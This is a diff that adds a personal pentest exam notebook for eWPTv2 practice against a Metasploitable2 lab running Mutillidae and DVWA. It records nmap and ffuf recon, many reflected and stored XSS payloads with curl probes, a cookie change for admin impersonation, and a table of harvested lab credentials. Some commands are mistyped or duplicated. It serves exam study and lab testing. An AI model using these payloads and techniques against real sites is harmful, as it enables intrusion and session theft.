@@ -1,0 +1,502 @@
+# eWPTv2 EXAM SESSION: `YYYY-MM-DD`
+
+**Start:** `HH:MM` · **Stop:** `HH:MM` · **Passing score:** `35 / 50 (70%)`
+
+Command conventions, placeholders and output file naming are in [🧭 phase-walkthrough.md](<../4. FINAL STRUCTURE/01 - Info-Gathering-and-Recon/🧭 phase-walkthrough.md>). Do not repeat them here.
+
+***
+
+## 🧭 How to take notes
+
+**Note first, paste nothing.** Write the command and one line of result, then save raw output to `recon/` and link the path. Pasting raw output costs time you need on the exam.
+
+**Log only what matters** (one line each, in the Log section):
+
+- Short title for the step, the command, and the question number if one applies.
+- One-line result with the anchor you would need to reproduce it (port, version, path, status, size, param name).
+- Output file path, if the output was saved.
+- Skip a row entirely when the command found nothing new — a clean scan doesn't need a log line.
+
+**Save to a file** when the output is longer than one screen (nmap, ffuf, gobuster, nikto, `openssl s_client`, `dig axfr`) or when you will need to grep it again. Quick `curl -I` or `dig +short` checks do not need a file.
+
+**Do not note:** raw output, tool banners, wordlist progress, repeated 404s, or the same scan run twice. Write a dead end in one line only when it rules out a path, so you do not retry it.
+
+**Pivot anchors:** every discovery names the next step. Examples: `Apache 2.2.8 → check version-specific CVEs`, `robots Disallow /private/ → add to Burp scope and ffuf list`, `param id numeric → SQLi check`.
+
+**Big-picture check** before you switch phase:
+- Every open web port is mapped to a host in the target map.
+- Every web host has a root crawl and a directory brute force.
+- Subdomains from DNS and SecLists brute force are either tested or ruled out.
+
+***
+
+## 🗂 Where information goes
+
+| Section | Holds | Updated |
+|---|---|---|
+| Target map | IP, app name, stack, status | Once at start, then per target |
+| Log | Commands with a relevant result, one line each | Live, as you run each command |
+| Discoveries (per target) | Facts with anchors: versions, paths, headers, params | After each scan |
+| Findings | Confirmed vulnerabilities only, with evidence file | When confirmed |
+| Credentials tracker | Every cred, hash, token and key | When found |
+| Question scratchpad | Question number → where the answer is | When a question is read |
+| Next steps | Ideas that came from discoveries | Continuously |
+
+***
+
+## 🗺 TARGET INFRASTRUCTURE MAP
+
+*Map IPs to apps and technologies as soon as the exam starts, so each question stays tied to the right host.*
+
+| Target | App / role | Stack (web, lang, DB, OS) | Status |
+| :----- | :--------- | :------------------------ | :----- |
+| `172.20.0.2` | `Metasploitable2` | `` | [ ] |
+
+***
+
+## 📜 LOG
+
+*One line per command. Newest at the bottom.*
+
+| Title | Command (short) | Result (one line) | Output file |
+| :---- | :--------------- | :----------------- | :----------- |
+| `Full port scan` | `nmap -Pn -n -sC -sV -p- --min-rate 1000 meta2 -oN recon/nmap-full-meta2.txt` | `Main services: ftp, http, mysql, postgresql, ` | `recon/nmap-full-meta2.txt` |
+| `Web ports scan` | `nmap -Pn -n -sV -p 80,514 --script http-enum,http-title,http-methods,http-robots.txt meta2 -oN recon/nmap-http-meta2.txt` | `Apache, methods allowed, ` | `recon/nmap-http-meta2.txt` |
+| `Fingerprinting` | `whatweb -v "http://meta2/mutillidae" > recon/whatweb-mutillidae-80.txt` | `Stack and versions` | `recon/whatweb-,utillidae-80.txt` |
+| `Bruteforcing` | `ffuf -u "http://meta2/mutillidae/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -e php -mc all -fc 404 -ac -t 10 -o recon/ffuf-dirs-mutillidae -of all` | `Hidden directories and files` | `ffuf-dirs-mutillidae.html` |
+| `Backups` | `ffuf -u "ffuf -u "http://meta2/mutillidae/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -e .bak,.old,.swp,.tmp,~,.zip,.tar.gz,.sql,.orig,.save,.env -mc 200 -ac -t 10 -o recon/ffuf-backups-mutillidae -of all` | `Hidden backup files` | `ffuf-backups-mutillidae.html` |
+
+***
+
+## 🛠 TARGET: `172.20.0.2 (meta2)`
+
+### 0. Overview & questions
+
+- **Role / description:** `Entry point for further services / apps / db's`
+- **Underlying machines and services**:
+    - DVWA
+    - Mutillidae
+    - DAV
+    - Twiki
+    - phpMyAdmin
+- **Related questions:** `Qxx, Qyy`
+
+### 1. Discoveries
+
+#### 1.1. Metasploitable 2
+
+- **Server banner:** `Apache httpd 2.2.8 ((Ubuntu) DAV/2)`
+- **Title**: `Metasploitable2 - Linux`
+- **Accepted methods:** `GET HEAD POST OPTIONS`
+- **Hidden paths**:
+```markdown
+|   /test/: Test page
+|   /phpinfo.php: Possible information file
+|   /phpMyAdmin/: phpMyAdmin
+|   /doc/: Potentially interesting directory w/ listing on 'apache/2.2.8 (ubuntu) dav/2'
+|   /icons/: Potentially interesting folder w/ directory listing
+|_  /index/: Potentially interesting folder
+```
+- **Stack**: 
+    - `PHP Version 5.2.4-2ubuntu5.10`    
+    - `FTP enabled`
+    - `MySQL 5.0.51a`
+    - `OpenSSL 0.9.8g 19 Oct 2007`
+    - `Session cookie: PHPSESSID=a894c3102d120b1a9d5c9cddaef5eb9f`
+
+
+#### 1.2 Mutillidae
+
+*Facts that look like exam material: versions, paths, headers, error messages, parameters. Each one carries its pivot.*
+
+- **Server banner:** `Apache httpd 2.2.8 ((Ubuntu) DAV/2)`
+- **Title**: `Mutillidae`
+- **Accepted methods:** `-`
+- **Framework / tech:**
+    - `Apache httpd 2.2.8 ((Ubuntu) DAV/2)`
+    - `PHP Version 5.2.4-2ubuntu5.10`
+    - `FTP enabled`
+    - `MySQL 5.0.51a`
+    - `OpenSSL 0.9.8g 19 Oct 2007`
+    - `JQuery`
+- **Hidden paths / files / fields:** 
+    - Vulnerabilities declared: `http://meta2/mutillidae/documentation/vulnerabilities.php`
+    - Test scripts: `http://meta2/mutillidae/documentation/Mutillidae-Test-Scripts.txt`
+- **Comments**:
+    - `example`
+- **JS files**:
+    - `http://meta2/mutillidae/javascript/html5-secrets.js`
+- **Cookies**:
+    - `PHPSESSID`
+- **Metafiles:**
+    - robots.txt
+        - User-agent: *
+        - `Disallow: ./passwords/`
+        - `Disallow: ./config.inc`
+        - `Disallow: ./classes/`
+        - `Disallow: ./javascript/`
+        - `Disallow: ./owasp-esapi-php/`
+        - `Disallow: ./documentation/`
+- **Paths and parameters**:
+    - GET
+        - Authentication (**important**): `?page=login.php`
+        - Registration (**important**): `?page=register.php`
+        - Database (**important**): `/mutillidae/index.php?page=set-up-database.php`
+        - `http://meta2/mutillidae/index.php?page=user-info.php&username=dsa&password=das&user-info-php-submit-button=View+Account+Details`
+        - `http://meta2/mutillidae/`
+        - `http://meta2/mutillidae/index.php`
+        - `http://meta2/mutillidae/index.php?page`
+            - home
+            - notes
+            - change-log.htm
+            - php-errors
+            - usage-instructions
+            - login
+            - show-log
+            - add-to-your-blog
+            - browser-info
+            - capture-data
+            - credits
+            - dns-lookup
+            - documentation
+            - html5-storage
+            - installation
+            - password-generator
+            - pen-test-tool-lookup
+            - register
+            - secret-administrative-pages
+            - set-background-color
+            - site-footer-xss-discussion
+            - source-viewer
+            - text-file-viewer
+            - user-info
+                - username
+                - password
+                - user-info-php-submit-button
+            - view-someones-blog
+            - user-poll
+                - choice
+                - initials
+                - user-poll-php-submit-button
+            - redirectandlog
+                - forwardurl
+        - `http://meta2/mutillidae/index.php?do`
+    - POST
+        - `/mutillidae/index.php`
+            - `DOMStorageKey`
+            - `DOMStorageItem`
+            - `SessionStorageType`
+        - `/mutillidae/index.php?page=dns-lookup.php`
+            - `target_host`
+            - `dns-lookup-php-submit-button`
+        - `/mutillidae/index.php?page=pen-test-tool-lookup.php`
+            - `ToolID`
+            - `pen-test-tool-lookup-php-submit-button`
+        - `/mutillidae/index.php?page=set-background-color.php`
+            - `background_color`
+            - `set-background-color-php-submit-button`
+        - `/mutillidae/index.php`
+            - `page`
+            - `phpfile`
+            - `source-file-viewer-php-submit-button`
+        - `/mutillidae/index.php?page=text-file-viewer.php`
+            - `textfile`
+            - `text-file-viewer-php-submit-button`
+        - `/mutillidae/index.php?page=view-someones-blog.php`
+            - `author`
+            - `view-someones-blog-php-submit-button`
+        - `mutillidae/index.php?page=add-to-your-blog.php`
+            - `csrf-token`
+            - `blog_entry`
+            - `add-to-your-blog-php-submit-button`
+        - `mutillidae/index.php?page=login.php`
+            - `username`
+            - `password`
+            - `login-php-submit-button`
+        - `mutillidae/index.php?page=register.php`
+            - `username`
+            - `password`
+            - `confirm_password`
+            - `my_signature`
+            - `register-php-submit-button`
+- **Entry points**:
+    - User info form
+    - Login form
+    - Register form
+    - View someones blog form
+    - Add new blog
+    - Pages:
+        - site-footer-xss-discussion.php
+        - html5-storage.php
+        - capture-data.php
+        - dns-lookup.php
+        - password-generator.php
+        - user-poll.php
+        - set-background-color.php
+        - pentest-lookup.php
+- **Headers**:
+    - Request
+        - `Referer`
+        - `Host`
+        - `Cookie`
+            - showhints
+            - PHPSESSID
+        - `Origin`
+    - Response
+        - `X-Powered-By`
+        - `Server`
+        - `Set-Cookie`
+        - `Logged-In-User`
+
+#### 1.3 DVWA
+
+*Facts that look like exam material: versions, paths, headers, error messages, parameters. Each one carries its pivot.*
+
+- **Server banner:** `Apache httpd 2.2.8 ((Ubuntu) DAV/2)`
+- **Title**: `Damn Vulnerable Web Application`
+- **Accepted methods:** `-`
+- **Framework / tech:**
+- **Hidden paths / files:** 
+    - `/example`
+- **Metafiles:** `robots.txt` Disallow `<paths>`
+- **Parameters:** `?placeholder`
+- **Interesting paths**:
+    - GET
+        - Authentication: `example.php`
+
+#### 1.4 phpMyAdmin
+
+*Facts that look like exam material: versions, paths, headers, error messages, parameters. Each one carries its pivot.*
+
+- **Server banner:** `Apache httpd 2.2.8 ((Ubuntu) DAV/2)`
+- **Title**: `Damn Vulnerable Web Application`
+- **Accepted methods:** `-`
+- **Framework / tech:**
+- **Hidden paths / files:** 
+    - `/example`
+- **Metafiles:** `robots.txt` Disallow `<paths>`
+- **Parameters:** `?placeholder`
+- **Interesting paths**:
+    - GET
+
+### 2. Findings
+
+*Divide in two blocks: gathering and finding. Gathering should be quick and straightforward. Finding should be concise and contain the successful payload. Think about merging both*
+
+#### `WSTG-INPV-01` · `Reflected XSS`
+
+- **Related questions:** `Qxx`
+- **URL / parameter:** `curl -sk "http://meta2/mutillidae?page=zzXSS9f2a" | grep -c "zzXSS9f2a"`
+- **Type and technique:** `GET XSS reflected`
+- **Evidence:** `All chars accepted`
+- **Flag / value:** ```page=zzXSS9f2a'\"<>\`\\\${{7*7}}```
+- **Impact:** `HTML injection with <script>`
+- **Target**: `HTML href attribute`
+- **Payload**: `page?="></a><script>alert(1);</script>`
+
+#### `WSTG-INPV-01` · `Reflected XSS`
+
+- **Related questions:** `Qxx`
+- **URL / parameter:** `curl -sk -X POST -d "target_host=zzXSS9f2a&dns-lookup-php-submit-button=zzXSS9f2a" -H "application/x-www-form-urlencoded" "http://meta2/mutillidae/index.php?page=dns-lookup.php" | grep -c "zzXSS9f2a"`
+- **Type and technique:** `POST XSS reflected`
+- **Evidence:** all chars - pseudo chars
+- **Flag / value:**
+    - ```zzXSS9f2a'"<>`\${{7*7}}```
+    - ```zzXSS9f2a'&quot;&lt;&gt;`\${{7*7}}```
+- **Impact:** `HTML injection with <script>`
+- **Target**: `HTML body`
+- **Payload**: `page?=</p><script>alert(document.domain)</script>`
+- **Tags allowed**: `script img svg body input iframe details math marquee`
+- **Attributes allowed**: `onerror onload onfocus onmouseover onpointerover ontoggle`
+
+#### `WSTG-INPV-01` · `Reflected XSS`
+
+- **Related questions:** `Qxx`
+- **URL / parameter:** `curl -sk -X POST -d "ToolID=zzXSS9f2a&pen-test-tool-lookup-php-submit-button=zzXSS9f2a" -H "application/x-www-form-urlencoded" "http://meta2/mutillidae/index.php?page=pen-test-tool-lookup.php" | grep -c "zzXSS9f2a"" | grep -c "zzXSS9f2a"`
+- **Type and technique:** `POST XSS reflected`
+- **Evidence:** all chars - pseudo chars
+- **Flag / value:**
+    - ```zzXSS9f2a'"<>`\${{7*7}}```
+    - ```zzXSS9f2a'&quot;&lt;&gt;`\${{7*7}}```
+- **Impact:** `HTML injection with <script> / JS injection`
+- **Target**: `HTML body / JavaScript`
+- **Payloads**: 
+    - Causing error, so HTML is injected in body through JavaScript: `ToolID='''[['</td><script>alert(document.domain)</script>`
+    - Breaking the JSON at JavaScript: `12312321"}});alert(document.domain);--`
+- **Tags allowed**: `script img svg body input iframe details math marquee`
+- **Attributes allowed**: `onerror onload onfocus onmouseover onpointerover ontoggle`
+
+
+#### `WSTG-INPV-01` · `Reflected XSS`
+
+- **Related questions:** `Qxx`
+- **URL / parameter:** `curl -sk -X POST -d "background_color=zzXSS9f2a&set-background-color-php-submit-button=zzXSS9f2a" -H "application/x-www-form-urlencoded" "http://meta2/mutillidae/index.php?page=set-background-color.php" | grep -c "zzXSS9f2a" | grep -c "zzXSS9f2a"`
+- **Type and technique:** `POST XSS reflected`
+- **Evidence:** all chars - pseudo chars
+- **Flag / value:**
+    - ```zzXSS9f2a'"<>`\${{7*7}}```
+    - ```zzXSS9f2a'&quot;&lt;&gt;`\${{7*7}}```
+- **Impact:** `HTML injection with <script>`
+- **Target**: `HTML body`
+- **Payloads**: 
+    - Close style attribute and proceed with injection: `background_color="><script>alert(document.domain)</script>`
+- **Tags allowed**: `script img svg body input iframe details math marquee`
+- **Attributes allowed**: `onerror onload onfocus onmouseover onpointerover ontoggle`
+
+#### `WSTG-INPV-01` · `Reflected XSS`
+
+- **Related questions:** `Qxx`
+- **URL / parameter:** `curl -sk -X POST -d "textfile=zzXSS9f2a&text-file-viewer-php-submit-button=zzXSS9f2a" -H "application/x-www-form-urlencoded" "http://meta2/mutillidae/index.php?page=text-file-viewer.php" | grep -c "zzXSS9f2a"`
+- **Type and technique:** `POST XSS reflected`
+- **Evidence:** all chars - pseudo chars
+- **Flag / value:**
+    - ```zzXSS9f2a'"<>`\${{7*7}}```
+    - ```zzXSS9f2a'&quot;&lt;&gt;`\${{7*7}}```
+- **Impact:** `HTML injection with <script>`
+- **Target**: `HTML body`
+- **Payloads**: 
+    - Direct html body injection (full chars): `textfile=</p><script>alert(document.domain)</script>`
+- **Tags allowed**: `script img svg body input iframe details math marquee`
+
+#### `WSTG-INPV-01` · `Reflected XSS`
+
+- **Related questions:** `Qxx`
+- **URL / parameter:** `curl -sk -X POST -d "csrf-token=zzXSS9f2a&blog_entry=zzXSS9f2a&add-to-your-blog-php-submit-button=zzXSS9f2a" -H "application/x-www-form-urlencoded" "http://meta2/mutillidae/index.php?page=add-to-your-blog.php" | grep -c "zzXSS9f2a"`
+- **Type and technique:** `POST XSS reflected`
+- **Evidence:** all chars - pseudo chars
+- **Flag / value:**
+    - ```zzXSS9f2a'"<>`\${{7*7}}```
+    - ```zzXSS9f2a'&quot;&lt;&gt;`\${{7*7}}```
+- **Impact:** `HTML injection with <script>`
+- **Target**: `HTML body`
+- **Payloads**: 
+    - Direct html body injection (no errors): `</td><script>alert(document.domain)</script>`
+    - Causing error, so HTML is injected in body through JavaScript: `'''[]</td><script>alert(document.domain)</script>`
+- **Tags allowed**: `script img svg body input iframe details math marquee`
+- **Attributes allowed**: `onerror onload onfocus onmouseover onpointerover ontoggle`
+
+#### `WSTG-INPV-01` · `Reflected XSS`
+
+- **Related questions:** `Qxx`
+- **URL / parameter:** `curl -sk -X POST -d "username=zzXSS9f2a&password=zzXSS9f2a&confirm_password=zzXSS9f2a&my_signature=zzXSS9f2a&register-php-submit-button=zzXSS9f2a" -H "application/x-www-form-urlencoded" "http://meta2/mutillidae/index.php?page=register.php" | grep -c "zzXSS9f2a"`
+- **Type and technique:** `POST XSS reflected`
+- **Evidence:** all chars - pseudo chars
+- **Flag / value:**
+    - ```zzXSS9f2a'"<>`\${{7*7}}```
+    - ```zzXSS9f2a'&quot;&lt;&gt;`\${{7*7}}```
+- **Impact:** `HTML injection with <script>`
+- **Target**: `HTML body`
+- **Payloads**: 
+    - Direct html body injection (no errors): `</h2><script>alert(document.domain)</script>`
+- **Tags allowed**: `script img svg body input iframe details math marquee`
+- **Attributes allowed**: `onerror onload onfocus onmouseover onpointerover ontoggle`
+
+#### `WSTG-INPV-01` · `Reflected XSS`
+
+- **Related questions:** `Qxx`
+- **URL / parameter:** `curl -sk -X POST -d "username=zzXSS9f2a&password=zzXSS9f2a&login-php-submit-button=zzXSS9f2a" -H "application/x-www-form-urlencoded" "http://meta2/mutillidae/index.php?page=login.php" | grep -c "zzXSS9f2a"`
+- **Type and technique:** `POST XSS reflected`
+- **Evidence:** all chars - pseudo chars
+- **Flag / value:**
+    - ```zzXSS9f2a'"<>`\${{7*7}}```
+    - ```zzXSS9f2a'&quot;&lt;&gt;`\${{7*7}}```
+- **Impact:** `HTML injection with <script>`
+- **Target**: `HTML body`
+- **Payloads**: 
+    - Direct html body injection (no errors): `'''[[</td><script>alert(document.cookie)</script>`
+- **Tags allowed**: `script img svg body input iframe details math marquee`   
+- **Attributes allowed**: `onerror onload onfocus onmouseover onpointerover ontoggle`
+
+#### `WSTG-INPV-02` · `Stored XSS`
+
+- **Related questions:** `Qxx`
+- **URL / parameter:** `http://meta2/mutillidae/index.php?page=add-to-your-blog.php`
+- **Evidence:** all chars
+- **Type and technique:** `Stored XSS`
+- **Payload:** `csrf-token=SecurityIsDisabled&blog_entry=<script>alert(document.cookie)</script>&add-to-your-blog-php-submit-button=Save+Blog+Entry`
+- **Target:** `HTML body`
+- **Impact:** `HTML body injection`
+
+#### `WSTG-INPV-02` · `Stored XSS`
+
+- **Related questions:** `Qxx`
+- **URL / parameter:** 
+    - `http://meta2/mutillidae/index.php?page=regiser.php`
+    - `http://meta2/mutillidae/index.php?page=login.php`
+- **Evidence:** all chars
+- **Type and technique:** `Stored XSS`
+- **Payload:** `username=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&password=zzXSS9f2a&confirm_password=zzXSS9f2a&my_signature=zzXSS9f2a&register-php-submit-button=Create+Account`
+- **Target:** `HTML body`
+- **Impact:** `XSS injection in both post redirection page when submitting register and also after login`
+
+#### `WSTG-INPV-02` · `Stored XSS`
+
+- **Related questions:** `Qxx`
+- **URL / parameter:** 
+    - `http://meta2/mutillidae/index.php?page=add-to-your-blog.php`
+- **Evidence:** all chars
+- **Type and technique:** `Stored XSS`
+- **Payload:** Set cookie `username=admin;uid=1`
+- **Target:** `Cookie injection`
+- **Impact:** `Blog entry is saved under the admin profile`
+
+#### `<WSTG-ID>` · `<Finding title>`
+
+- **Related questions:** `Qxx`
+- **URL / parameter:** `<URL>` / `<param>`
+- **Type and technique:** `<type>`, `<payload or technique>`
+- **Evidence:** `recon/<file>` (line `<n>`), or screenshot
+- **Flag / value:** `<value>`
+- **Impact:** `<one line>`
+
+### 3. Next steps
+
+- [ ] `<next step>` (from discovery `<n>`)
+
+### 4. Lessons
+
+*Phases need to be shortened in time*
+
+- During the recon phase, you can start to identify, at the same time, which inputs are reflected, stored or DOM for the XSS phase. Just note that down and keep moving. That eliminates manual curl phase to identify Stored XSS, for example
+- When discovering DOM XSS, instead of doing it with curl and for / while loops, gathering manually all js urls, saved them into a txt file and grep each line
+- Very important: work in the identification phase and find out the best way to perform it. Right now there are operations taking too much time only for this phase.
+- Headers and cookies. It's enough with the ones in the guide? Should be performed page by page?
+- Sweep whole application vs based on questions. Analyze this. The idea would be following a methodology but not trapping yourself into a rabgitbit hole. **Review identification**
+- I'll say it again: XSS identification phase! We need to accelerate that. Study how can you leverage in BS in order to speed things up.
+- In SQLi, when identifying source parameters, regular ones, such as GET/POST parameters, text fields, search boxes or form values, are clear. But what happens with cookies and headers? Should we exploit the ones already appear in the requests caught by BurpSuite or, rather, adding more on our own?
+
+***
+
+## 🔑 CREDENTIALS TRACKER (all targets)
+
+*Update live for any credential, hash, token or key.*
+
+| Username | Password / hash / token | Source | Works on | Notes |
+| :------- | :---------------------- | :----- | :------- | :---- |
+| `None` | `DU837HHFYTEYUE9S1934` | `JS hidden file` | `http://meta2/mutillidae/javascript/html5-secrets.js` | `-` |
+| `dbHost=localhost, dbUser=root, dbName=metasploit` | `' '` | `mutillidae/inc` | `http://meta2/mutillidae/inc` | `root` |
+| `admin` | `adminpass, phrase=Monkey!!!` | `/passwords/accounts.txt` | `http://meta2/mutillidae/passwords/accounts.txt` | `user` 
+| `adrian` | `somepassword, phrase=Zombie Films Rock!!!` | `/passwords/accounts.txt` | `http://meta2/mutillidae/passwords/accounts.txt` | `user` 
+| `john` | `monkey, phrase=I like the smell of confunk` | `/passwords/accounts.txt` | `http://meta2/mutillidae/passwords/accounts.txt` | `user` 
+| `ed` | `pentest, phrase=Commandline KungFu anyone?` | `/passwords/accounts.txt` | `http://meta2/mutillidae/passwords/accounts.txt` | `user` 
+| `dbHost=localhost,dbUser=root,dbName=owasp10` | `root` | `mutillidae/config.inc` | `http://meta2/mutillidae/config.inc` | `admin` |
+| `<user>` | `<secret>` | `<source>` | `<url or service>` | `<access level>` |
+
+***
+
+## 📝 EXAM QUESTION SCRATCHPAD
+
+- **`Qxx`:** `<what it asks>` → `<where the answer is or will be>`
+
+***
+
+## 💡 QUICK TIPS
+
+1. Read all exam questions at the start. Group them by target and note the group in each target's overview.
+2. Screenshot key request/response pairs (flags, version banners, successful exploits) from Burp Repeater.
+3. Verify versions in HTTP responses or the application UI, not only in service scans.
+4. Keep this file local and offline. Have tools and wordlists ready before you start.
+
+***
+
+To add a target, copy the `🛠 TARGET:` block and change the IP, role and related questions.
